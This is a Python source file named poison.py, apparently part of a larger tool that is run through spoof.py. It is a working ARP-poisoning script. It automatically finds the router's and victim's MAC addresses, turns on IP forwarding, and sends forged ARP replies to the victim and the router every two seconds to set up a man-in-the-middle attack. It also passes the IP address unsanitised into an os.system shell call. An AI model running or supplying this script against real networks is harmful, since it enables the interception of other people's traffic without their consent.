# ========================================================================
# File:         poison.py
# Authors:      Ilyas LATRACH
# Date:         Sep 2021
# Functions:    getHostMacAddr() - Retrieve MAC address of host machine
#               getMacAddrFromIP() - Retrieve MAC address given a LAN IP
#               getRouterIP() - Retrieve IP address of router on network
#               ArpPoison() - Main loop for ARP poisoning functionality
#               Main() - Prevents direct execution
#
# Description:
#   A simple ARP poisoning script that at minimum only requires a victim
#   IP from the user to automatically discover the IP and MAC address of
#   the router as well as the MAC addresses of the host machine and victim
#   machine. It then uses this information to send ARP packets to both
#   the victim machine and the router every 2 seconds establishing a
#   MitM attack.
# ========================================================================
import os
import re
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
from subprocess import Popen, PIPE


# ========================================================================
# Function: getHostMacAddr()
# Input:    iface       - Network hardware interface (string)
# Desc.:    Simply retrieves the current host's mac address from the file
#           located at /sys/class/net/*iface*/address.
# ========================================================================
def getHostMacAddr(iface):
    with open('/sys/class/net/{}/address'.format(iface)) as f:
        mac = f.read()
        return mac.rstrip()


# ========================================================================
# Function: getMacADdrFromIP()
# Input:    ip          - IP address to check (string)
#           ping        - Optional variable to ping the IP first (bool)
# Desc.:    Gets the MAC address from the 'arp -a' command. To ensure that
#           the IP exists in the current ARP table, by default we first
#           ping the IP, to also check if it is connectable.
# ========================================================================
def getMacAddrFromIP(ip, ping=True):
    if(ping is True):
        # Send to /dev/null to surpress output
        response = os.system("ping -c 1 {} > /dev/null".format(ip))
    else:
        response = 0
    if(response == 0):
        cmd1 = Popen(['arp', '-a', ip], stdout=PIPE)
        cmd2 = Popen(['awk', '{print $4}'], stdin=cmd1.stdout, stdout=PIPE)
        mac = cmd2.communicate()[0].rstrip()
        return mac
    else:
        exit("Could not establish connection to {}. Exiting...".format(ip))


# ========================================================================
# Function: getRouterIP()
# Input:    None
# Desc.:    Looks for the gateway entry in the arp table and returns the
#           MAC address.
# ========================================================================
def getRouterIP():
    cmd1 = Popen(['arp', '-a'], stdout=PIPE)
    cmd2 = Popen(['awk', '/gateway/ {print $2}'], stdin=cmd1.stdout, stdout=PIPE)
    routerIP = re.sub('[\(\)\{\}<>]', '', cmd2.communicate()[0])
    return routerIP.rstrip()


# ========================================================================
# Function: ArpPoison()
# Input:    victimIP        - Target's IP address
#           routerIP        - Router's IP address
#           iface           - Interface to use on host machine
# Desc.:    Main function of poison.py. Gathers information about the
#           network then creates and sends ARP packets to the victim
#           machine and the router to establish the MitM attack
# ========================================================================
def ArpPoison(victimIP, routerIP, iface):
    if(routerIP is None):
        routerIP = getRouterIP()
    routerMAC = getMacAddrFromIP(routerIP, False)
    victimMAC = getMacAddrFromIP(victimIP)
    hostMAC = getHostMacAddr(iface)

    # Enable forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print("Victim found @ {} : {}".format(victimIP, victimMAC))
    print("Router found @ {} : {}".format(routerIP, routerMAC))
    print("Starting ARP poisoning process")

    while 1:
        try:
            sendp(Ether(src=hostMAC, dst=victimMAC)/ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
            sendp(Ether(src=hostMAC, dst=routerMAC)/ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
            sleep(2)
        except KeyboardInterrupt:
            exit("")


# Prevent direct loading
def main():
    exit("Please run spoof.py")


if __name__ == '__main__':
    main()
